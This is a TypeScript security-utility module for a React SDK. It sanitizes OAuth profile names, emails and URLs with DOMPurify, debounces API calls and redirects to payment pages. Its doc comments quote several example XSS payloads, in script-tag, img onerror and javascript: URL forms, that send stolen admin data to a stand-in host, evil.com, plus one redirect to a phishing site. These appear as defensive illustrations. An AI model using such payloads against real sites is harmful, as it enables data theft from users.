/**
 * Client-side security utilities for Echo React SDK
 *
 * SECURITY DOCUMENTATION:
 *
 * This module provides essential client-side security protections for the Echo React SDK:
 *
 * 1. XSS Protection: Sanitizes user-controlled data (names, emails) that could contain
 *    malicious scripts injected via compromised OAuth providers or man-in-the-middle attacks
 *
 * 2. CSP Compatibility: Provides alternatives to popup-based flows that would be blocked
 *    by Content Security Policy headers in enterprise environments
 *
 * 3. Rate Limiting: Client-side request debouncing to prevent API abuse and improve UX
 *
 * WHY THESE PROTECTIONS ARE NEEDED:
 * - OAuth providers can be compromised, injecting malicious data into user profiles
 * - Enterprise deployments require CSP compatibility for security compliance
 * - Rapid API calls can trigger rate limiting and degrade user experience
 */

import DOMPurify from 'dompurify';

// Initialize DOMPurify for both browser and Node.js environments
const purify = (() => {
  if (typeof window !== 'undefined') {
    // Browser environment
    return DOMPurify;
  } else {
    // Node.js environment (testing) - import JSDOM dynamically to avoid issues
    try {
      const { JSDOM } = require('jsdom');
      const { window } = new JSDOM('');
      return DOMPurify(window);
    } catch {
      // Fallback if JSDOM is not available
      return {
        sanitize: (dirty: string) =>
          String(dirty || '').replace(/<[^>]*>/g, ''),
      } as typeof DOMPurify;
    }
  }
})();

/**
 * Sanitizes user-provided text to prevent XSS attacks
 *
 * SECURITY PURPOSE: Prevents execution of malicious JavaScript injected into
 * user profile data (name, email, etc.) from compromised OAuth providers.
 *
 * ATTACK SCENARIO PREVENTED:
 * - Attacker compromises OAuth provider or performs MITM attack
 * - Injects: user.name = '<script>fetch("/api/admin").then(r=>r.json()).then(d=>fetch("https://evil.com", {method:"POST", body:JSON.stringify(d)}))</script>'
 * - Without sanitization: Script executes when name is rendered, stealing admin data
 * - With sanitization: Script tags removed, only safe text displayed
 *
 * @param input - Raw user input that may contain malicious content
 * @returns Sanitized string safe for DOM rendering
 *
 * @example
 * ```typescript
 * // Dangerous: Direct rendering of user data
 * <div>Welcome, {user.name}!</div> // ❌ VULNERABLE TO XSS
 *
 * // Safe: Sanitized rendering
 * <div>Welcome, {sanitizeText(user.name)}!</div> // ✅ PROTECTED
 * ```
 */
export function sanitizeText(input: string | null | undefined): string {
  if (!input) return '';

  // Ensure we have a string to work with
  const stringInput = String(input);

  try {
    // Use properly initialized DOMPurify
    let sanitized = purify.sanitize(stringInput, {
      ALLOWED_TAGS: [], // No HTML tags allowed
      ALLOWED_ATTR: [], // No attributes allowed
      KEEP_CONTENT: true, // Keep text content
      RETURN_DOM: false, // Return string, not DOM
      RETURN_DOM_FRAGMENT: false, // Return string, not fragment
      FORCE_BODY: true, // Force processing in body context to handle SVG
    });

    // DOMPurify can be overly aggressive with certain tags - use fallback if result is empty but input has text
    if (!sanitized.trim() && stringInput) {
      // Extract potential text content by removing HTML tags
      const textContent = stringInput.replace(/<[^>]*>/g, '').trim();
      if (textContent) {
        // Fallback for problematic cases where DOMPurify strips everything
        sanitized = stringInput
          .replace(/<[^>]*>/g, '') // Remove all HTML tags
          .replace(/javascript:/gi, '') // Remove javascript: URLs
          .replace(/on\w+\s*=/gi, '') // Remove event handlers
          .trim();
      }
    }

    return sanitized.trim().slice(0, 1000); // Limit length to prevent DoS
  } catch {
    // Fallback: Simple regex-based sanitization
    const fallbackSanitized = stringInput
      .replace(/<[^>]*>/g, '') // Remove all HTML tags
      .replace(/javascript:/gi, '') // Remove javascript: URLs
      .replace(/on\w+\s*=/gi, '') // Remove event handlers
      .trim();

    return fallbackSanitized.slice(0, 1000);
  }
}

/**
 * Sanitizes user profile data for safe display in UI components
 *
 * SECURITY PURPOSE: Comprehensive sanitization of all user profile fields
 * that could be controlled by attackers through OAuth profile injection.
 *
 * @param profile - User profile from OAuth provider (potentially malicious)
 * @returns Sanitized profile safe for UI display
 *
 * @example
 * ```typescript
 * // Before sanitization (dangerous):
 * const maliciousProfile = {
 *   name: '<img src=x onerror="fetch(\'/admin\').then(r=>r.text()).then(d=>navigator.sendBeacon(\'https://evil.com\', d))">John',
 *   email: 'john@example.com"><script>document.location="https://phishing.com"</script>',
 * };
 *
 * // After sanitization (safe):
 * const safeProfile = sanitizeUserProfile(maliciousProfile);
 * // { name: 'John', email: 'john@example.com' }
 * ```
 */
export function sanitizeUserProfile(profile: {
  name?: string;
  email?: string;
  picture?: string;
  [key: string]: unknown;
}): {
  name: string;
  email: string;
  picture: string;
} {
  return {
    name: sanitizeText(profile.name),
    email: sanitizeEmail(profile.email),
    picture: sanitizeUrl(profile.picture),
  };
}

/**
 * Sanitizes email addresses and validates format
 *
 * SECURITY PURPOSE: Prevents email-based injection attacks and ensures
 * only valid email formats are processed.
 *
 * @param email - Email address to sanitize and validate
 * @returns Valid sanitized email or empty string
 */
export function sanitizeEmail(email: string | null | undefined): string {
  if (!email) return '';

  const sanitized = sanitizeText(email);

  // Extract just the email portion if there's extra content
  const emailMatch = sanitized.match(
    /^([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/
  );
  if (emailMatch) {
    return emailMatch[1] ?? '';
  }

  return '';
}

/**
 * Sanitizes URLs to prevent javascript: and data: URI attacks
 *
 * SECURITY PURPOSE: Prevents execution of JavaScript through malicious
 * URLs in user profile pictures or other URL fields.
 *
 * ATTACK SCENARIO PREVENTED:
 * - Attacker sets profile.picture = "javascript:fetch('/admin').then(r=>r.json()).then(d=>fetch('https://evil.com', {method:'POST', body:JSON.stringify(d)}))"
 * - Without sanitization: JavaScript executes when image loads
 * - With sanitization: Dangerous URL scheme blocked
 *
 * @param url - URL to sanitize
 * @returns Safe HTTP/HTTPS URL or empty string
 */
export function sanitizeUrl(url: string | null | undefined): string {
  if (!url) return '';

  const sanitized = sanitizeText(url);

  try {
    const parsed = new URL(sanitized);

    // Only allow safe protocols - block javascript:, data:, file:, etc.
    if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
      return sanitized;
    }

    return '';
  } catch {
    return '';
  }
}

/**
 * Debounces function calls to prevent API spam and rate limiting
 *
 * SECURITY/UX PURPOSE: Prevents excessive API calls that could:
 * - Trigger server-side rate limiting (causing authentication failures)
 * - Create poor user experience with multiple rapid requests
 * - Overwhelm client-side state management
 *
 * SCENARIO PREVENTED:
 * - User rapidly clicks "Refresh Balance" button
 * - Without debouncing: 10 API calls in 1 second, rate limit triggered
 * - With debouncing: Only 1 API call executed, smooth user experience
 *
 * @param func - Function to debounce
 * @param delay - Delay in milliseconds (recommended: 500-1000ms for user actions)
 * @returns Debounced function that only executes after delay
 *
 * @example
 * ```typescript
 * // Without debouncing (problematic):
 * const handleRefresh = () => refreshBalance(); // ❌ Can spam API
 *
 * // With debouncing (protected):
 * const handleRefresh = debounce(refreshBalance, 1000); // ✅ Max 1 call/second
 * ```
 */
export function debounce<T extends (...args: unknown[]) => unknown>(
  func: T,
  delay: number
): (...args: Parameters<T>) => void {
  let timeoutId: NodeJS.Timeout | null = null;

  return (...args: Parameters<T>) => {
    if (timeoutId) {
      clearTimeout(timeoutId);
    }

    timeoutId = setTimeout(() => {
      func(...args);
    }, delay);
  };
}

export async function openPaymentFlow(
  paymentUrl: string,
  options: {
    onComplete?: () => void;
    onCancel?: () => void;
    onError?: (error: Error) => void;
  } = {}
): Promise<void> {
  const { onError } = options;

  // Sanitize the payment URL to prevent injection
  const safeUrl = sanitizeUrl(paymentUrl);
  if (!safeUrl) {
    const error = new Error('Invalid payment URL provided');
    onError?.(error);
    throw error;
  }

  try {
    // Direct redirect - no popups, much simpler
    window.location.href = safeUrl;
  } catch (err) {
    const error = err instanceof Error ? err : new Error('Payment flow failed');
    onError?.(error);
    throw error;
  }
}
